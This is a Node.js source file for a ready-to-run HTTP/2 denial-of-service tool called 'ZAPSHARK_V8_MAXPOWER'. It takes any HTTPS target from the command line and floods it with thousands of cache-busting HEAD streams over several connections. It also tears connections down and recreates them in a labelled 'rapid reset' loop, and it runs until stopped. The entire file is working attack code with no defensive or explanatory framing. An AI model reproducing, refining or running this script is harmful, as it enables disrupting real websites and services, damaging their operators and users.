const http2 = require('http2');

class ZAPSHARK_V8_MAXPOWER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.requestsSinceLastCalc = 0;
        this.lastDisplayUpdate = Date.now();
        
        // MAX POWER SETTINGS
        this.clients = [];
        this.clientCount = 10;
        this.maxStreamsPerClient = 1000;
        this.activeStreams = 0;
        
        // EXTREME RAPID RESET
        this.resetCounter = 0;
        
        // MEMORY LEAK FIX
        this.requestMap = new Map();
        this.lastCleanup = Date.now();
        
        // INTERVALS
        this.attackInterval = null;
        this.resetIntervalObj = null;
        this.displayInterval = null;
    }

    // === MAX CONNECTIONS ===
    initializeMaxConnections() {
        for (let i = 0; i < this.clientCount; i++) {
            try {
                const client = http2.connect(this.targetUrl);
                client.setMaxListeners(1000);
                client.on('error', () => {});
                this.clients.push(client);
            } catch (err) {}
        }
    }

    createClient() {
        try {
            const client = http2.connect(this.targetUrl);
            client.setMaxListeners(1000);
            client.on('error', () => {});
            return client;
        } catch (err) {
            return null;
        }
    }

    // === EXTREME RAPID RESET ===
    performExtremeReset() {
        this.resetCounter++;
        
        if (this.clients.length > 0) {
            const clientIndex = Math.floor(Math.random() * this.clients.length);
            const client = this.clients[clientIndex];
            
            if (client) {
                try {
                    client.destroy();
                    const newClient = this.createClient();
                    if (newClient) {
                        this.clients[clientIndex] = newClient;
                    }
                } catch (err) {}
            }
        }
    }

    // === MEMORY LEAK FIX ===
    cleanupStaleRequests() {
        const now = Date.now();
        if (now - this.lastCleanup > 5000) { // Every 5 seconds
            for (const [reqId, timestamp] of this.requestMap.entries()) {
                if (now - timestamp > 10000) { // 10 seconds old
                    this.requestMap.delete(reqId);
                }
            }
            this.lastCleanup = now;
        }
    }

    // === MAX POWER ATTACK WITH HEAD METHOD ===
    sendMaxRequests() {
        if (this.clients.length === 0) return;
        
        this.cleanupStaleRequests(); // MEMORY LEAK FIX
        
        const maxPossibleStreams = this.maxStreamsPerClient * this.clients.length;
        const availableStreams = maxPossibleStreams - this.activeStreams;
        const streamsThisTick = Math.max(1, Math.floor(availableStreams * 0.8));
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.clients[Math.floor(Math.random() * this.clients.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                const reqId = Math.random().toString(36);
                this.requestMap.set(reqId, Date.now()); // TRACK REQUEST
                
                const req = client.request({
                    ':method': 'HEAD',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
                });
                
                // FIX: REMOVE EVENT LISTENERS PROPERLY
                const cleanup = () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    this.requestMap.delete(reqId); // CLEANUP TRACKING
                    req.removeAllListeners(); // PREVENT MEMORY LEAK
                };
                
                req.once('response', () => {
                    req.destroy();
                    cleanup();
                });
                
                req.once('error', () => {
                    req.destroy();
                    cleanup();
                });
                
                req.once('close', cleanup);
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === ONLY LOGGING - OVERWRITING ===
    updateDisplay() {
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
    }

    // === MAIN - RUN FOREVER ===
    start() {
        this.initializeMaxConnections();
        
        setTimeout(() => {
            // EXTREME RAPID RESET
            this.resetIntervalObj = setInterval(() => {
                this.performExtremeReset();
            }, 0.5);
            
            // MAX ATTACK LOOP
            this.attackInterval = setInterval(() => {
                for (let batch = 0; batch < 5; batch++) {
                    this.sendMaxRequests();
                }
                this.updateDisplay();
            }, 0.1);
            
            // EXTRA MEMORY CLEANUP
            setInterval(() => {
                if (global.gc) global.gc();
            }, 30000);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            clearInterval(this.attackInterval);
            clearInterval(this.resetIntervalObj);
            
            this.clients.forEach(client => {
                try { client.destroy(); } catch (e) {}
            });
            
            this.requestMap.clear(); // CLEANUP
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    process.exit(1);
}

const shark = new ZAPSHARK_V8_MAXPOWER(target);
shark.start();
